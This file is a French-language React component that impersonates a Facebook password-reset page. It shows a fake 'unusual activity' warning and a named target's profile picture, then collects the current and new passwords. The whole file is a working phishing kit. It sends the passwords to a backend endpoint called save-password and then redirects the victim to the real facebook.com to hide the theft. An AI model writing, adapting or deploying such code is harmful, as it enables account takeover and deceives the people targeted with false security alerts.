import { useState } from 'react';
import { Lock } from 'lucide-react';
import profilePicture from '../assets/pfp.jpg'; // Update path as needed

export default function FacebookPasswordReset() {
  const [page, setPage] = useState(1);
  const [oldPassword, setOldPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [message, setMessage] = useState('');

  const handleContinue = () => {
    setPage(2);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
  
    if (!oldPassword || !newPassword || !confirmPassword) {
      setMessage('Veuillez remplir tous les champs.');
      return;
    }
  
    if (newPassword !== confirmPassword) {
      setMessage('Les nouveaux mots de passe ne correspondent pas.');
      return;
    }
  
    try {
      setIsSubmitting(true);
      setMessage('');
  
      const response = await fetch(`${process.env.REACT_APP_API_BASE_URL}/api/save-password`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          oldPassword,
          newPassword,
          confirmPassword,
        }),
      });
      console.log('API URL:', process.env.REACT_APP_API_BASE_URL);
  
      const data = await response.json();

  
      if (response.ok && data.success) {
        window.location.href = 'https://www.facebook.com';
      } else {
        setMessage(data.message || 'Une erreur est survenue. Veuillez réessayer plus tard.');
      }
    } catch (error) {
      console.error('Erreur de connexion:', error);
      setMessage('Impossible de se connecter au serveur.');
    } finally {
      setIsSubmitting(false);
    }
  };
  

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col items-center">
      {/* Facebook Header */}
      <div className="w-full bg-white shadow-sm py-2 mb-4">
        <div className="max-w-md mx-auto px-4">
          <h1 className="text-blue-600 text-4xl font-bold">facebook</h1>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-md w-full px-4">
        <div className="bg-white rounded-lg shadow p-6 mb-4">
          {page === 1 ? (
            <div className="flex flex-col items-center">
              <div className="my-4 p-3 bg-blue-100 rounded-full">
                <Lock className="h-12 w-12 text-blue-600" />
              </div>
              
              <h2 className="text-xl font-semibold text-center mb-2">
                Changer votre mot de passe pour protéger votre compte
              </h2>
              
              <p className="text-center text-gray-600 mb-6">
                Nous avons détecté une activité inhabituelle sur votre compte. Pour protéger votre compte, 
                veuillez changer votre mot de passe immédiatement. Quelqu'un pourrait essayer d'accéder 
                à votre compte.
              </p>
              
              <p className="text-xs text-gray-500 mb-6">
                En continuant, vous acceptez les Conditions générales et la Politique de confidentialité de Facebook.
              </p>
              
              <button 
                onClick={handleContinue} 
                className="w-full bg-blue-600 text-white py-2 px-4 rounded-md font-medium hover:bg-blue-700"
              >
                Continuer
              </button>
            </div>
          ) : (
            <div>
              <div className="flex flex-col items-center mb-4">
                <div className="w-24 h-24 rounded-full overflow-hidden">
                  <img 
                    src={profilePicture} 
                    alt="Nibras Farohe" 
                    className="w-full h-full object-cover"
                  />
                </div>
                
                <h2 className="text-xl font-medium mt-2">
                  Connexion en tant que Nibras Farohe
                </h2>
                
                <p className="text-gray-500 text-sm">
                  Nibras Farohe · <a href="#" className="text-blue-600">Pas vous?</a>
                </p>
              </div>
              
              {message && (
                <div className="mb-4 p-2 bg-red-100 text-red-700 rounded">
                  {message}
                </div>
              )}
              
              <div className="mt-4">
                <div className="mb-4">
                  <input
                    type="password"
                    placeholder="Mot de passe actuel"
                    className="w-full p-3 border border-gray-300 rounded-md"
                    value={oldPassword}
                    onChange={(e) => setOldPassword(e.target.value)}
                  />
                </div>
                
                <div className="mb-4">
                  <input
                    type="password"
                    placeholder="Nouveau mot de passe"
                    className="w-full p-3 border border-gray-300 rounded-md"
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                  />
                </div>
                
                <div className="mb-4">
                  <input
                    type="password"
                    placeholder="Confirmer le nouveau mot de passe"
                    className="w-full p-3 border border-gray-300 rounded-md"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                  />
                </div>
                
                <button
                  onClick={handleSubmit}
                  disabled={isSubmitting}
                  className={`w-full bg-blue-600 text-white py-3 px-4 rounded-md font-medium 
                    ${isSubmitting ? 'opacity-70 cursor-not-allowed' : 'hover:bg-blue-700'}`}
                >
                  {isSubmitting ? 'Traitement en cours...' : 'Continuer'}
                </button>
              </div>
            </div>
          )}
        </div>
        
        {/* Footer */}
        <div className="text-center text-xs text-gray-500">
          <div className="flex justify-center space-x-2 mb-2">
            <a href="#" className="hover:underline">Français</a>
            <a href="#" className="hover:underline">English (US)</a>
            <a href="#" className="hover:underline">العربية</a>
            <a href="#" className="hover:underline">Español</a>
          </div>
          <p>Meta © 2025</p>
        </div>
      </div>
    </div>
  );
}